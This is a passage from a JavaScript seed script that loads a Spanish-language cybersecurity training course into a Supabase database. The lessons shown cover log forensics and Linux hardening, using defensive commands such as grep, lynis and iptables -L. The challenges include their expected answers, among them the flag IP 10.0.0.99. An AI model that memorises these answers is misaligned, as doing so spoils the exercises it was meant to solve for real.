- Accesos a horas inusuales (entre 2:00 y 5:00 AM)
- Múltiples intentos fallidos de login
- Peticiones a \`/admin\` desde IPs externas
- Comandos sudo de usuarios que no deberían tenerlos
- Archivos modificados en /etc o /var/www

## Tu flag

La flag es la **IP del atacante** en formato:
\`FLAG{IP_DEL_ATACANTE}\`

## Herramientas disponibles

- \`grep\` → filtrar logs
- \`forensics\` → análisis automatizado
- \`cat\` → leer archivos
- \`netstat\` → ver conexiones`,
        examples: [
          { title: 'Revisar intentos fallidos', code: 'grep Failed /var/log/auth.log', explanation: 'Busca todos los intentos de login fallidos en el log de autenticación' },
          { title: 'Peticiones sospechosas', code: 'grep POST /var/log/access.log', explanation: 'Las peticiones POST a rutas inusuales pueden indicar explotación' },
          { title: 'Ataques detectados por WAF', code: 'cat /var/log/error.log', explanation: 'El WAF (ModSecurity) registra los ataques que detectó y bloqueó' },
          { title: 'Análisis completo', code: 'forensics timeline', explanation: 'Reconstruye la cronología completa del ataque' },
        ],
        challenges: [
          {
            title: 'Identifica al atacante',
            description: 'Analiza los logs y determina la IP del atacante. Pista: es la misma IP en auth.log y access.log.',
            starter_code: 'forensics auth-analysis',
            expected_output: '10.0.0.99',
            hints: ['La IP que más intentos fallidos tiene es la sospechosa', 'Compara con access.log para confirmar', 'La IP aparece en ambos logs'],
          },
        ],
      },
    ],
  },
  {
    slug: 'defensa-hardening',
    title: 'Fase 5: Defensa y Hardening',
    description: 'Aprende a defender sistemas: firewalls, hardening, detección de intrusos.',
    icon: '🛡️',
    sort_order: 6,
    lessons: [
      {
        slug: 'hardening-linux',
        title: 'Hardening de Linux',
        description: 'Configura un servidor Linux seguro: cierra puertas, endurece permisos, monitorea.',
        difficulty: 'hard',
        estimated_minutes: 20,
        sort_order: 1,
        theory: `# Hardening de Linux

## ¿Qué es Hardening?

**Hardening** (endurecimiento) es el proceso de asegurar un sistema reduciendo su superficie de ataque.

## Checklist de Hardening

### 1. SSH
- ❌ Deshabilitar login como root
- ✅ Usar solo claves SSH (no contraseñas)
- ✅ Cambiar puerto por defecto (22)
- ✅ Limitar intentos: MaxAuthTries 3

### 2. Firewall (iptables/ufw)
- Política por defecto: **DROP** (denegar todo)
- Solo abrir puertos necesarios
- Rate limiting contra fuerza bruta

### 3. Actualizaciones
- Instalar parches de seguridad regularmente
- Habilitar actualizaciones automáticas de seguridad

### 4. Usuarios y permisos
- Principio de menor privilegio
- Eliminar usuarios innecesarios
- Contraseñas fuertes + 2FA

### 5. Logs y monitoreo
- Configurar log rotation
- Enviar logs a servidor centralizado (SIEM)
- Alertas para eventos críticos

### 6. Servicios
- Deshabilitar servicios innecesarios
- Actualizar software a últimas versiones

## Herramientas

- **Lynis** → auditoría de seguridad
- **Fail2ban** → bloqueo automático de fuerza bruta
- **AIDE** → detección de cambios en archivos
- **ClamAV** → antivirus para Linux`,
        examples: [
          { title: 'Verificar SSH config', code: 'cat /etc/ssh/sshd_config', explanation: 'Revisa la configuración SSH — busca PermitRootLogin, MaxAuthTries' },
          { title: 'Auditoría de seguridad', code: 'lynis audit', explanation: 'Ejecuta una auditoría completa del sistema y da recomendaciones' },
          { title: 'Firewall status', code: 'iptables -L', explanation: 'Muestra las reglas del firewall — verifica qué está permitido' },
          { title: 'Usuarios activos', code: 'cat /etc/passwd', explanation: 'Lista todos los usuarios — elimina los que no necesitas' },
        ],
        challenges: [
          {
            title: 'Audita el servidor',
            description: 'Ejecuta una auditoría de seguridad y reporta las vulnerabilidades encontradas.',
            starter_code: 'lynis audit',
            expected_output: 'ADVERTENCIA',
            hints: ['lynis analiza toda la configuración del sistema', 'Busca las advertencias (WARNING)', 'Las sugerencias de Hardening son mejoras recomendadas'],
          },
        ],
      },
    ],
  },
]

// ============================================================
// SEED
// ============================================================
async function seed() {
  console.log('🛡️  Seeding Hacking course...\n')

  const { data: existing } = await supabase
    .from('simulator_courses')
    .select('id')
    .eq('slug', 'hacking')
    .single()

  let courseId

  if (existing) {
    console.log('⚠️  Curso "hacking" ya existe. Actualizando...')
    const { data, error } = await supabase
      .from('simulator_courses')
      .update(COURSE)
      .eq('id', existing.id)
      .select()
      .single()
    if (error) throw error
    courseId = data.id

    const { data: oldModules } = await supabase
      .from('simulator_modules')
      .select('id')
      .eq('course_id', courseId)
    
    if (oldModules?.length) {
      const moduleIds = oldModules.map(m => m.id)
      await supabase.from('simulator_lessons').delete().in('module_id', moduleIds)
      await supabase.from('simulator_modules').delete().eq('course_id', courseId)
      console.log(`   Eliminados ${oldModules.length} módulos anteriores`)
    }
  } else {
    const { data, error } = await supabase
      .from('simulator_courses')
      .insert(COURSE)
      .select()
      .single()
    if (error) throw error
    courseId = data.id
    console.log(`✅ Curso creado: ${data.title} (${courseId})`)
  }

  let totalLessons = 0
  for (const mod of MODULES) {
    const { lessons, ...moduleData } = mod
    const { data: moduleRow, error: modError } = await supabase
      .from('simulator_modules')
      .insert({ ...moduleData, course_id: courseId, is_active: true })
      .select()
      .single()

    if (modError) {
      console.error(`❌ Error módulo "${mod.title}":`, modError.message)
      continue
    }

    console.log(`  📦 ${moduleRow.title} (${lessons.length} lecciones)`)

    for (const lesson of lessons) {
      const { error: lessonError } = await supabase
        .from('simulator_lessons')
        .insert({
          ...lesson,
          module_id: moduleRow.id,
          is_active: true,
          examples: JSON.stringify(lesson.examples),
          challenges: JSON.stringify(lesson.challenges),
        })

      if (lessonError) {
        console.error(`    ❌ "${lesson.title}":`, lessonError.message)
      } else {
        console.log(`    📄 ${lesson.title}`)
        totalLessons++
      }
    }
  }

  console.log(`\n🎉 ¡Seed completado! ${MODULES.length} módulos, ${totalLessons} lecciones.`)
}

seed().catch(err => {
  console.error('❌ Error fatal:', err)
  process.exit(1)
})
